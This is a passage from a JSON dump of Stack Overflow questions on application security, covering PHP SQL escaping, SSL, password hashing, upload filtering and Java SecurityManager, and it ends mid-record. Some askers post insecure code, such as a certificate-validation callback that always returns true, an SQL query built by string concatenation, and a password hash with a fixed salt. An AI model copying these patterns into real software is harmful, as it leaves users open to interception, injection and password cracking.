there a framework, approach or tool to test the Vulnerability in a Mac app ?</p>\n\n<p>The idea is to test a Mac application for security related issues.</p>\n"},{"tags":["php","sql","security","sql-injection"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":4,"view_count":58,"score":-2,"question_id":12223349,"title":"Having trouble getting mysql_real_escape_string() to work properly","body":"<p>For preventing sql injections I tried this:</p>\n\n<pre><code>$db = new myConnectDB();\n\n$beerName = mysql_real_escape_string($beerName);\n$beerID = mysql_real_escape_string($beerID);\n$brewery = mysql_real_escape_string($brewery);\n$style = mysql_real_escape_string($style);\n$userID = mysql_real_escape_string($userID);\n$abv = mysql_real_escape_string($abv);\n$ibu = mysql_real_escape_string($ibu);\n$breweryID = mysql_real_escape_string($breweryID);\n$icon = mysql_real_escape_string($icon);\n\n\n$beerName = addslashes($beerName);\n$brewery = addslashes($brewery);\n$brewery = str_replace('\\'', '', $brewery);\n$query3 = \"INSERT INTO uniqueBeers (userID,beerID,beerName,beerStyle,beerBrewery,abv,ibu,breweryID,icon, brewIcon) VALUES ($userID, '$beerID', '$beerName', '$style' , '$brewery', '$abv','$ibu','$breweryID', '$icon', '$iconBrew')\";\n$db-&gt;query($query3);\n</code></pre>\n\n<p>But I get all sorts of error like:</p>\n\n<blockquote>\n  <p>Warning: mysql_real_escape_string() [function.mysql-real-escape-string]: Access denied for user </p>\n  \n  <p>Warning: mysql_real_escape_string() [function.mysql-real-escape-string]: Access denied for user </p>\n</blockquote>\n\n<p>After reading the errors and doing some reasearch online I noticed i could pass a connection in and I tried this:</p>\n\n<pre><code>$beerName = mysql_real_escape_string($beerName,$db);\n</code></pre>\n\n<p>for all the above entries but it also did not work so Now I am a little stuck. </p>\n\n<p>Update: </p>\n\n<p>Here is the contents of myConnectDB with my database info taken out</p>\n\n<pre><code>&lt;?php\n\nclass myConnectDB extends mysqli{\n\n    public function __construct($hostname='localhost',  \n        $user='',\n        $password='', \n        $dbname=''){\n        parent::__construct($hostname, $user, $password, $dbname);\n    }\n}\n?&gt;\n</code></pre>\n"},{"tags":["security","frameworks","java-ee","glassfish","jaas"],"answer_count":5,"favorite_count":6,"up_vote_count":7,"down_vote_count":0,"view_count":3355,"score":7,"question_id":540524,"title":"Java Security Framework","body":"<p>Security always tends to take the last place in a new project. Or you use a framework like Spring where security is already build-in and can be switched on easily.\nI try to find an open security framework that can be plugged-in to both Swing and Web applications (and JavaFX?), maybe easy to digest. I looked at plain JAAS, JGuard and JSecurity but its just too complicated to get started.\nAny recommendations or experience to share ?\nI am working with NB, Glassfish and MySQL.\nThanks\nSven</p>\n"},{"tags":["security","ssl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":62,"score":-6,"question_id":12223019,"title":"Why do I need SSL for my website?","body":"<p>What does SSL do and what are the bad things that can happen if I omit SSL for my website?</p>\n"},{"tags":["c#","winforms","security","https","webbrowser"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":266,"score":0,"question_id":12221490,"title":"How to disable Security Warning window in Webbrowser control","body":"<p>I'm using Webbrowser control to login to HTTPS site.\nbut I get popup \"Security Warning\":</p>\n\n<p><img src=\"http://i.stack.imgur.com/DqpUc.png\" alt=\"Security Warning window\"></p>\n\n<p>the codes below do n't work.why?</p>\n\n<pre><code>ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(ValidateServerCertificate);\n\n    public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)\n    {\n        return true;\n    }\n</code></pre>\n\n<p>where should i put these codes?</p>\n\n<p>also there is another old thread in stackoverflow with a codeproject link.<br>\nit does not work too...</p>\n\n<p>How can I disable this alert?  </p>\n\n<blockquote>\n  <p>i am using visual studio 2010 &amp; .net 4...</p>\n</blockquote>\n\n<p>thanks in advance</p>\n"},{"tags":["c#","winforms","security","textbox","password-protection"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":95,"score":1,"question_id":12221752,"title":"Extend TextBox's UseSystemPasswordChar security","body":"<p>While working on a remember me feature (for both username and password credentials) I noticed that it was possible to recover the passwords that were hidden when setting UseSystemPasswordChar property to true. Example on the screenshot below:</p>\n\n<p><img src=\"http://i.stack.imgur.com/GuzRD.jpg\" alt=\"UseSystemPasswordChar property set to true\"></p>\n\n<p>I also noticed that although a lot of applications suffer for the same issue not all do, so I assume there must be a way to avoid this.</p>\n\n<p>The question is, what approach do I need to take to ensure it is not possible to retrieve the credentials using this method ?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["security","ssl","query-string"],"answer_count":10,"favorite_count":4,"up_vote_count":13,"down_vote_count":0,"view_count":6468,"score":13,"question_id":190771,"title":"How secure is sending sensitive data over https?","body":"<p>Is SSL secure enough for using sensitive data (like password) in query string?\nIs there any extra options to implement?</p>\n"},{"tags":["javascript","css","security","background-image","screen-resolution"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":118,"score":1,"question_id":12220065,"title":"Displaying custom background images based on screen resolution","body":"<p>For a site, I need to be able to dynamically display background images depending on the user's screen resolution.</p>\n\n<p>I.e when the page starts loading, within the <code>&lt;head&gt;</code> a small javascript loads, which sets the page's background via css to something like <code>http://example.com/backgrounds/beach_800x600</code> where 800 and 600 is the screen resolution determined via the javascript.</p>\n\n<p>I'm creating various resized images for the most common screen resolutions, so that for most people there will be an exact match of their screen resolution with an existing image. If there's not an exact match made, e.g if a user has a screen resolution <code>AxB</code> for which there's no existing image, then an image will be created &amp; resized to <code>AxB</code> on the fly, and will be served. From then on, anyone with the resolution <code>AxB</code> would be served that image.</p>\n\n<p>The questions I have are:</p>\n\n<p>1) Is this a safe method? I.e I don't want more than 50 custom sized images created for custom screen resolutions. Would I be able to stay in that ball park with this method? And are there any other security risks I should be aware of with this method?</p>\n\n<p>2) Should I give it an error margin of say 50 or 100 pixels, so if someone's resolution is 700x900, and I don't have that but I have 600x800 or I have 800x1000, then I would serve those existing images rather than create new ones? If so, should I set the margin at 100 pixels or is there a better number?</p>\n"},{"tags":["php","security","apache","mod-rewrite"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":516,"score":0,"question_id":5689423,"title":"How to ban all executable files on Apache","body":"<p>I would like to find out the most effective way to ban any executable files from one specific sub folder on my server. I allow file uploads by users into that folder, and would like to make that folder accessible from the web. I have the root folder pretty much locked down with mod_rewrite. In that one unprotected sub-folder I have .htaccess with: </p>\n\n<pre>\nOptions +Indexes  \nIndexOptions +FancyIndexing +FoldersFirst +HTMLTable  \nRewriteEngine off\n</pre>\n\n<p>I know it is best to just restrict file uploads to a certain allowable file types, and I am already doing this in php. I am checking file extension, and mime type before allowing an upload like this:</p>\n\n<pre><code>$allmime=array('image/gif', 'image/png', 'image/jpeg', 'application/msword', 'application/pdf');\n$allext=array('png', 'jpg', 'gif', 'doc', 'pdf');\n$path=pathinfo($_FILES['file']['name']);\n$mime=trim(shell_exec(\"file -bi \" . $_FILES['file']['tmp_name']));\nif( !in_array( $path['extension'], $allext) || !in_array($mime, $allmime) ){\n    //ban\n}else{\n    //allow\n}\n</code></pre>\n\n<p>However I am not certain if there is some convoluted hack out there that will still allow a shell script to be uploaded and executed on the server, since all of the successfully uploaded files will be visible immediately. </p>\n\n<p>I know there is another option in .htaccess to filter out files like this:</p>\n\n<pre><code>&lt;FilesMatch \"\\.(sh|asp|cgi|php|php3|ph3|php4|ph4|php5|ph5|phtm|phtml)$\"&gt;\n    order allow, deny\n    deny from all\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>However I am not certain that this list is all-inclusive, plus this is hard to maintain, as new extensions might be installed in the future. </p>\n\n<p>To sum it all up: Anyone knows a good way to disallow all server executables, with the exception of php scripts directly executed by the <code>%{HTTP_HOST}</code>?</p>\n"},{"tags":["security","api","http","authentication","cors"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12213327,"title":"Is it safe to allow cross-domain access to all API resources?","body":"<p>Access to API resources may be authenticated by </p>\n\n<ol>\n<li><p>Credentials which can be sent automatically by web browsers but won't be sent cross-domain unless Access-Control-Allow-Credentials is set to \"true\" (e.g. cookies, HTTP Basic/Digest authentication, SSL certificates).</p></li>\n<li><p>A secret token, either in a HTTP header or as a query parameter in the URL, that has to be set manually by the client (e.g. an OAuth access token).</p></li>\n</ol>\n\n<p>With that in mind, is it always safe to set \"Access-Control-Allow-Origin: *\" on all resources in an API?</p>\n"},{"tags":["c","linux","security","ubuntu"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":3523,"score":6,"question_id":66870,"title":"How do I run a program as nobody?","body":"<p>I want a user-privileged (not root) process to launch new processes as user \"nobody\". I've tried a straight call to setuid that fails with -1 EPERM on Ubuntu 8.04:</p>\n\n<pre><code>#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() { \n       setuid(65534);\n       while (1);\nreturn 0;\n}\n</code></pre>\n\n<p>How should I do this instead?</p>\n"},{"tags":["c#","security","hash"],"answer_count":3,"favorite_count":1,"up_vote_count":8,"down_vote_count":1,"view_count":156,"score":7,"question_id":12218887,"title":"Is this a secure way to hash a password?","body":"<p>Could you please tell me if the following is a good way to securely hash a password to be stored in a database:</p>\n\n<pre><code>    public string CreateStrongHash(string textToHash) {\n\n        byte[] salt =System.Text.Encoding.ASCII.GetBytes(\"TeStSaLt\");\n\n        Rfc2898DeriveBytes k1 = new Rfc2898DeriveBytes(textToHash, salt, 1000);\n        var encryptor = SHA512.Create();\n        var hash = encryptor.ComputeHash(k1.GetBytes(16));\n\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i &lt; hash.Length; i++) {\n            sb.Append(hash[i].ToString(\"x2\"));\n        }\n\n        return sb.ToString();\n\n    }\n</code></pre>\n\n<p>Many Thanks in advance.</p>\n"},{"tags":["web-services","security","wso2","wso2esb"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":131,"score":0,"question_id":12171995,"title":"Invoking HTTPS end point from wso2 esb","body":"<p>How do I invoke a HTTPS endpoint from WSO2 ESB. My web service deployed on weblogic server is secured with policy \n<code>Wssp1.2-2007-Https-UsernameToken-Plain.xml</code> \nand the SOAP address specified in WSDL is<br>\n<code>https://172.16.91.21:7102/WLSAMLPack_62_64/CustomAsTAPIOnBuildingSAMLService</code></p>\n\n<p>When I try to create an endpoint from WSO2 esb and access it, it throws following error: </p>\n\n<blockquote>\n  <p>[2012-08-29 11:43:49,769] ERROR - ClientHandler I/O error : General\n  SSLEngine problem For : 172.16.91.21:7102 For Request : Axis2Request\n  [Message ID : urn:uuid:59ebea16-dcb0-4b25-8074-b78605e2ff55] [Status\n  Completed : false] [Status SendingCompleted : true]\n  javax.net.ssl.SSLHandshakeException: General SSLEngine problem    at\n  com.sun.net.ssl.internal.ssl.Handshaker.checkThrown(Handshaker.java:938)\n    at\n  com.sun.net.ssl.internal.ssl.SSLEngineImpl.checkTaskThrown(SSLEngineImpl.java:465)\n    at\n  com.sun.net.ssl.internal.ssl.SSLEngineImpl.writeAppRecord(SSLEngineImpl.java:1064)\n    at\n  com.sun.net.ssl.internal.ssl.SSLEngineImpl.wrap(SSLEngineImpl.java:1036)\n    at javax.net.ssl.SSLEngine.wrap(SSLEngine.java:452)     at\n  org.apache.http.impl.nio.reactor.SSLIOSession.doHandshake(SSLIOSession.java:154)\n    at\n  org.apache.http.impl.nio.reactor.SSLIOSession.isAppInputReady(SSLIOSession.java:265)\n    at\n  org.apache.http.impl.nio.SSLClientIOEventDispatch.inputReady(SSLClientIOEventDispatch.java:229)\n    at\n  org.apache.http.impl.nio.reactor.BaseIOReactor.readable(BaseIOReactor.java:158)\n    at\n  org.apache.http.impl.nio.reactor.AbstractIOReactor.processEvent(AbstractIOReactor.java:340)\n    at\n  org.apache.http.impl.nio.reactor.AbstractIOReactor.processEvents(AbstractIOReactor.java:318)\n    at\n  org.apache.http.impl.nio.reactor.AbstractIOReactor.execute(AbstractIOReactor.java:278)\n    at\n  org.apache.http.impl.nio.reactor.BaseIOReactor.execute(BaseIOReactor.java:104)\n    at\n  org.apache.http.impl.nio.reactor.AbstractMultiworkerIOReactor$Worker.run(AbstractMultiworkerIOReactor.java:542)\n    at java.lang.Thread.run(Thread.java:619) Caused by:\n  javax.net.ssl.SSLHandshakeException: General SSLEngine problem    at\n  com.sun.net.ssl.internal.ssl.Alerts.getSSLException(Alerts.java:174)\n    at\n  com.sun.net.ssl.internal.ssl.SSLEngineImpl.fatal(SSLEngineImpl.java:1427)\n    at\n  com.sun.net.ssl.internal.ssl.Handshaker.fatalSE(Handshaker.java:189)\n    at\n  com.sun.net.ssl.internal.ssl.Handshaker.fatalSE(Handshaker.java:181)\n    at\n  com.sun.net.ssl.internal.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1035)\n    at\n  com.sun.net.ssl.internal.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:124)\n    at\n  com.sun.net.ssl.internal.ssl.Handshaker.processLoop(Handshaker.java:516)\n    at com.sun.net.ssl.internal.ssl.Handshaker$1.run(Handshaker.java:458)\n    at java.security.AccessController.doPrivileged(Native Method)   at\n  com.sun.net.ssl.internal.ssl.Handshaker$DelegatedTask.run(Handshaker.java:875)\n    at\n  org.apache.http.impl.nio.reactor.SSLIOSession.doHandshake(SSLIOSession.java:171)\n    ... 9 more Caused by: sun.security.validator.ValidatorException: PKIX\n  path building failed:\n  sun.security.provider.certpath.SunCertPathBuilderException: unable to\n  find valid certification path to requested target     at\n  sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:285)\n    at\n  sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:191)\n    at sun.security.validator.Validator.validate(Validator.java:218)    at\n  com.sun.net.ssl.internal.ssl.X509TrustManagerImpl.validate(X509TrustManagerImpl.java:126)\n    at\n  com.sun.net.ssl.internal.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:209)\n    at\n  com.sun.net.ssl.internal.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:249)\n    at\n  com.sun.net.ssl.internal.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1014)\n    ... 15 more Caused by:\n  sun.security.provider.certpath.SunCertPathBuilderException: unable to\n  find valid certification path to requested target     at\n  sun.security.provider.certpath.SunCertPathBuilder.engineBuild(SunCertPathBuilder.java:174)\n    at java.security.cert.CertPathBuilder.build(CertPathBuilder.java:238)\n    at\n  sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:280)\n    ... 21 more</p>\n</blockquote>\n\n<p>Thanks. \nAbdul</p>\n"}]}
{"total":17772,"page":18,"pagesize":100,"questions":[{"tags":["security","math","statistics"],"answer_count":5,"favorite_count":3,"up_vote_count":16,"down_vote_count":2,"view_count":2413,"score":14,"question_id":2120655,"title":"What is the Entropy of Android's Dot Password System?","body":"<p>How many <em>permutations</em> of the androids dot login system are possible?   I know for a fact the solution to this lies in Discrete Math,  specifically <a href=\"http://www.mathsisfun.com/combinatorics/combinations-permutations.html\" rel=\"nofollow\">Permutations Without Repetition</a>,  If your answer doesn't use permutations or combinations you are incorrect.</p>\n\n<p>The length of passwords is between 4 and 9 dots,  There are a total of 9 dots to permute though.  so my initial equation is:</p>\n\n<pre><code>9P4+9P5+9P6+9P7+9P8+9P9\n</code></pre>\n\n<p>However,  I know this equation is incomplete because it does not take into consideration all of the rules.  Each dot is distinct because of is position so if you assign a number to each dot as follows:</p>\n\n<pre><code>123\n456\n789\n</code></pre>\n\n<p>The password \"1397\" is impossible,  if you attempt to use this password you will in fact have entered in \"1236987\" because the numbers in-between are automatically selected.  Another equation needs to be created to account for these limitations and then subtract off from my nPr equation above. </p>\n\n<p>This <a href=\"http://beust.com/weblog2/archives/000497.html\" rel=\"nofollow\">link</a> has a great video of someone using the android login.  It also goes into greater detail into the rules.  The math on that page is completely incorrect,  he is not even close to a real solution. </p>\n"},{"tags":["php","security","xss"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":802,"score":2,"question_id":638057,"title":"Should I htmlspecialchars() variables inside <title></title>?","body":"<p>Is it necessary to filter/escape unsafe variables in <code>&lt;title&gt;</code> or other tags in <code>&lt;head&gt;</code> to prevent XSS?</p>\n"},{"tags":["security","authentication","symfony2","firewall","access-control"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1334,"score":0,"question_id":9085432,"title":"Symfony2 Security.yml","body":"<p>I'm trying to take advantage of Symfony's authentication and authorization capabilities however I'm somewhat confused as to what my security.yml file should look like.</p>\n\n<p>I'm looking to accomplish the following objectives:</p>\n\n<p>1) The routes / and /join (are avilable to everyeone - no login required).</p>\n\n<p>2) all other routes require a login/password.</p>\n\n<p>3) the /adimin route should be futher restricted to admin users only.</p>\n\n<p>4) all users should be authenticated against the database. </p>\n\n<p>I have item 4 figured out (I think) - see below. I'm not sure what the <code>administrators:</code> word means though. Does that mean only administrators use the User class? Should that say <code>users:</code> or something else?</p>\n\n<pre><code>security:\n    encoders:\n        MySite\\Bundle\\Entity\\User:\n            algorithm: sha1\n            encode_as_base64: false\n            iterations: 1\n\nproviders:\n    administrators: (??? what doest his mean ???)\n        entity: { class: MySiteBundle:User }\n</code></pre>\n\n<p>More Importantly -- </p>\n\n<p>For Items 1, 2, and 3 I'm not sure what to put. I have a bunch of entries under the <code>firewalls:</code> section and the <code>access_control:</code> sections however It just doesnt work or make sense. Can someone post what the security.yml should look like just by the goals I'm looking to accomplish in numbers 1 - 3?</p>\n"},{"tags":["security","symfony2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12202970,"title":"Customize action taken when not authenticated","body":"<p>I have a Symfony 2.1 application where, depending on the url requested, I want to take a different action when the user's credentials have expired. I'm using the fos_userbundle which, by default, redirects to the login url. In my case, instead of redirecting, I want to return special response that the client will handle.</p>\n\n<p><strong>Idea #1:</strong><br>\nI'm not sure exactly what I need to do to accomplish this. I've stepped through the code and found where the <code>Symfony\\Component\\Security\\Http\\Firewall\\ExceptionListener</code> is catching the exception that was thrown and eventually a <code>RedirectResponse</code> is set. I think I need to hook into here somewhere and set a different response but I haven't found it yet.</p>\n\n<p><strong>Idea #2:</strong><br>\nI think I maybe need to setup another firewall that will handle the missing credentials differently. This seems like it would be a lot more work and doesn't quite <em>feel</em> right.</p>\n\n<p>Both of my ideas may be way off base. It seems like it shouldn't be that difficult of a think to figure out, but I've searched high and low and can't find an answer.</p>\n"},{"tags":["java","security","manager"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":88,"score":1,"question_id":12208002,"title":"Java Security Manager checkExec","body":"<p>I'm having an issue trying to implement a security check in the Java Security Manager.</p>\n\n<p>I seem to have misunderstood the purpose of the checkExec() method in the security manager. I thought it would get called when my application tries to invoke another Java application via the command line, but that doesn't seem to be happening.</p>\n\n<p>Here's what I want to happen: An invoking application which uses my custom security manager executes \"java SomeApp\" on the command line. The security manager checks if this is OK and performs the appropriate action.</p>\n\n<p>To try to accomplish this, I did the following:</p>\n\n<p>1) Created a custom security manager which overrides the checkExec method. The method signature is \"public void checkExec(String cmd)\".</p>\n\n<p>2) Created a test class, SecurityTest.</p>\n\n<p>3) SecurityTest assigns my custom security manager as its security manager.</p>\n\n<p>4) SecurityTest then runs \"java InvokeMe\" on the command line.</p>\n\n<p>5) The custom security manager intercepts this and does something.</p>\n\n<p>1 through 4 are fine, but 5 never happens. I've verified that my custom security manager is valid, it is successfully assigned to SecurityTest, and SecurityTest successfully runs InvokeMe. However, to the best of my ability to discern, the checkExec() method in my custom security manager never gets called.</p>\n\n<p>Where am I going wrong? Is what I'm trying to do (have the security manager do something when an application invokes \"java SomeApp\") even possible?</p>\n\n<p>Thank you for your time.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>Here is some code and output that results from running a test. This is rapid-prototype style, \"crank it out and clean up later\" style code so it's not going to be beautiful:</p>\n\n<p>Custom security manager:</p>\n\n<pre><code>import java.util.*;\nimport java.io.*;\nclass DTESecurityManager extends SecurityManager {\n    // instance variables\n\n    DTESecurityManager() {\n        super();\n        //assign a bunch of variables\n        System.out.println(\"TEST 1\");\n    }\n\n    public void checkExec(String cmd) {\n        if (cmd.toLowerCase().startsWith(\"java \")) {\n            if (cmd.matches(\"(?i).*-djava.security.manager.*\")) {\n                throw new SecurityException(\"Cannot assign a security manager to invoked Java applications.\");\n            }\n            StringBuffer intermediateCommand = new StringBuffer(cmd).insert(5, \"-Djava.security.manager=DTESecurityManager \");\n            String modifiedCommand = new String(intermediateCommand);\n            try {\n                Runtime rt = Runtime.getRuntime();\n                Process pr = rt.exec(modifiedCommand);\n            } catch (Exception e) {\n                System.err.println(\"Error: \" + e.getMessage());\n            }\n            try {\n                FileWriter fstream = new FileWriter(\"Verification.txt\");\n                BufferedWriter out= new BufferedWriter(fstream);\n                out.write(\"I worked.\");\n                out.close();\n            } catch (Exception e) {\n                System.err.println(\"Error: \" + e.getMessage());\n            }\n            throw new SecurityException(\"Command was executed, but was modified to force invoked application to use this security manager.\");\n        }\n    }\n}\n</code></pre>\n\n<p>SecurityTest:</p>\n\n<pre><code>import java.io.*;\n\nclass SecurityTest {\n\n    public static void main(String[] args) {\n        try {\n            System.setSecurityManager(new DTESecurityManager());\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n        try {\n            System.out.println(\"If we got this far, we had no problems setting our security manager.\");\n            System.out.println(\"Now let's try to invoke another Java application.\");\n            Runtime rt = Runtime.getRuntime();\n            Process pr = rt.exec(\"java InvokeMe\");\n            System.out.println(\"I reached the end of my test without crashing. Now terminating.\");\n        } catch (Exception e) {\n            System.out.println(\"Exception message: \" + e.getMessage());\n        }\n    }\n\n}\n</code></pre>\n\n<p>InvokeMe:</p>\n\n<pre><code>import java.io.*;\n\nclass InvokeMe {\n\n    public static void main(String[] args) {\n        System.out.println(\"I, InvokeMe, have been invoked successfully.\");\n        try {\n        FileWriter fstream = new FileWriter(\"InvokeMeWasCalled.txt\");\n            BufferedWriter out= new BufferedWriter(fstream);\n            out.write(\"It worked.\");\n            out.close();\n        } catch (Exception e) {\n            System.err.println(\"Error: \" + e.getMessage());\n        }\n    }\n\n}\n</code></pre>\n\n<p>Test output:</p>\n\n<pre><code>TEST 1\nIf we got this far, we had no problems setting our security manager.\nNow let's try to invoke another Java application.\nI reached the end of my test without crashing. Now terminating.\n</code></pre>\n\n<p>There is no indication that checkExec() is getting called -- no console output, and Verification.txt doesn't exist anywhere on my filesystem. (Of course, I'm not sure what a security manager subclass' behavior is supposed to be when performing actions like this -- so maybe that's normal. If that's the case, I need another quick-and-dirty method to test whether I'm hitting certain lines of code.) InvokeMeWasCalled.txt does exist, so that part is definitely working.</p>\n"},{"tags":["ajax","cookies","security"],"answer_count":1,"favorite_count":20,"up_vote_count":26,"down_vote_count":0,"view_count":11848,"score":26,"question_id":661599,"title":"Login/session cookies, Ajax and security","body":"<p>I'm trying to determine the most secure method for an ajax based login form to authenticate and set a client side cookie. I've seen things about XSS attacks such as this:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/27972/are-httponly-cookies-a-viable-option-for-an-ajax-website\">http://stackoverflow.com/questions/27972/are-httponly-cookies-a-viable-option-for-an-ajax-website</a></p>\n\n<p>and</p>\n\n<p><a href=\"http://www.codinghorror.com/blog/archives/001167.html\" rel=\"nofollow\">http://www.codinghorror.com/blog/archives/001167.html</a></p>\n\n<p>So, I guess my core questions are...</p>\n\n<p>1) Is using pure ajax to set cookies secure, if so, what is the most secure method (httpOnly + SSL + encrypted values, etc.)?</p>\n\n<p>2) Does a pure ajax method involve setting the cookie client side?  Is this at all secure?</p>\n\n<p>3) Is setting cookies this way reliable across all major browsers/OSs?</p>\n\n<p>4) Would using a hidden IFrame be any more secure (calling a web page to set the cookies)?</p>\n\n<p>5) If possible, does anybody have code for this (PHP is my backend)?</p>\n\n<p>My goal is to set the cookies and have them available for the next call to the server without navigating away from the page.</p>\n\n<p>I really want to nail down the consensus, most secure way to do this.  Eventually, this code is planned to be made Open Source, so please no commercial code (or nothing that wouldn't stand up to public scrutiny)</p>\n\n<p>Thanks,\n-Todd</p>\n"},{"tags":["security","shell","ssh"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":12208131,"title":"login shell for proxy(ssh-D) access only?","body":"<p>I want create an user in remote host(e.g. proxy.example.com), is there something Restricted login shell like git-shell for proxy-only ssh access?</p>\n"},{"tags":["java","security","authentication","java-ee"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":251,"score":0,"question_id":7524602,"title":"User authentication management with user token and session management in java web application","body":"<p>i am using  devise and authlogic in rails that provide all user management functionality with email sending , session management ,token  generation </p>\n\n<p>is there any ready api available in java that provides all user login management functionality ? </p>\n\n<p>please  suggests any idea</p>\n"},{"tags":["security","encryption","rsa","aes"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":576,"score":4,"question_id":2093726,"title":"For sending passwords over the wire, which is more secure:  Diffie-Helman/AES  or RSA?   (It bothers me that AES doesn't obscure password length)","body":"<p>I was given advice that I am suspicious about so I'm looking for support here to go back and challenge the advice.</p>\n\n<p>I was advised to use Diffie-Helman to get both sides to agree on a secret key, use the secret key to generate an AES key, and then use AES to encrypt/decrypt passwords that are being transmitted.   Pretty much like the sample code here: <a href=\"http://www.cryptopp.com/wiki/Diffie-Hellman\" rel=\"nofollow\">http://www.cryptopp.com/wiki/Diffie-Hellman</a></p>\n\n<p>When using this scheme, the length of the encrypted password is the same as the length of the unencrypted password.   Should I be worried about this?</p>\n\n<p>Before, I was using RSA, encrypting the passwords with the receiver's public key.  This was resulting in an encrypted length of 256 no matter what the password length.  Isn't that better?</p>\n"},{"tags":["php","security","frameworks","atk4"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":54,"score":0,"question_id":12193556,"title":"PHP Agile Toolkit Security","body":"<p>What about security?</p>\n\n<p>How does Agile Toolkit prevent attacks?</p>\n\n<p>How does it handle captcha, xss, csrf, sql injection and session hijacking?</p>\n"},{"tags":["javascript","security","ssl","web"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":224,"score":3,"question_id":12203711,"title":"Can \"Show Insecure Content\" Browser Prompt Be Detected?","body":"<p>We are all familiar with the problem of mixed scheme (http / https) content on a page. </p>\n\n<p><img src=\"http://i.stack.imgur.com/Wr0bE.png\" alt=\"enter image description here\"></p>\n\n<p>I'm working on a site on which this is unavoidable. I <strong>do not want to prevent this</strong>. I know there are a ton of questions / answers on that.</p>\n\n<p>What I need is simply to <strong>detect</strong> this (via JavaScript?) so I can tweak the page behavior (show a notice of degraded behavior or something). Any help?</p>\n"},{"tags":["c#","security"],"answer_count":4,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":90,"score":8,"question_id":12206487,"title":"Is putting c# code in a code-behind and compiling it to a DLL any more secure than an inline <script> block?","body":"<p>I constantly have to do little 10-line code snippets for customer websites.  Other people in my office are now asking me to put the code in DLLs, as the code sometimes contains a password for a 3rd party webservice, or something else of similar security.  Is it actually any more secure if compiled to a DLL?  </p>\n"},{"tags":["security","service","store"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":8,"score":0,"question_id":12206523,"title":"Erro when I try create a new target application on SP2010","body":"<p>When I select [secure store service] and click [manage] the SP show me a message; \"Cannot complete this action as the Secure Store Shared Service is not responding..\". someone knows how correct this?</p>\n"},{"tags":["security","networking","device"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":5,"score":0,"question_id":12206502,"title":"What is an approach to securing communications for a manufactured network device?","body":"<p>There are many questions here about self-signed vs. CA signed certificates for use to enable TLS (SSL) communications with network devices (Typically for HTTP front ends or HTTPS).  I would like to take a step back and ask what approaches people know of for securing communications with a manufactured network device.  The goals are (in no particular order):</p>\n\n<ul>\n<li>Since the device is manufactured the customer is expecting a plug and go experience, or minimal setup.</li>\n<li>Since the device will be used on the customers network, manufacturing cannot know the host name, IP Address, or DHCP settings that the device will run under.</li>\n<li>Communications with the device is expected to be secure from reasonable effort (say a few years), not expected to be very secure.</li>\n<li>Since the device will be configure \"in the field\" the security setup must be very straight forward.</li>\n</ul>\n\n<p>I am assuming that I will use an HTML front end made available via HTTPS with a self signed certificate.  This will lead to only mild security and a certain amount of user frustration, but I thought I would ask the question to see if there is a different path.  BTW, for extra credit, how about the case where the customers network is not connected to the Internet?</p>\n\n<p>Thanks for any thoughts you can share.</p>\n"},{"tags":["security","unit-testing","surefire"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12205400,"title":"SercurityManager not playing well with powermock running surefire","body":"<p>I want to restrict access to the file system and the network while running unit tests. I have gotten things pretty much working up until I use powermock and it gives me this error:</p>\n\n<pre><code>Tests in error: \n  initializationError({full.path.to.test.Class}): javassist.NotFoundException: org.powermock.api.extension.proxyframework.ProxyFrameworkImpl\n</code></pre>\n\n<p>I have give some permissions to the code base and other libraries that it depend on\nmy security policy looks as follows:</p>\n\n<pre><code>// all code gets the following permissions\ngrant {\npermission java.io.FilePermission \"${java.io.tmpdir}\", \"read,write\";\npermission java.io.FilePermission \"${basedir}/-\", \"read\";\npermission java.util.PropertyPermission \"*\", \"read,write\";\npermission java.lang.RuntimePermission \"createClassLoader\";\npermission java.lang.RuntimePermission 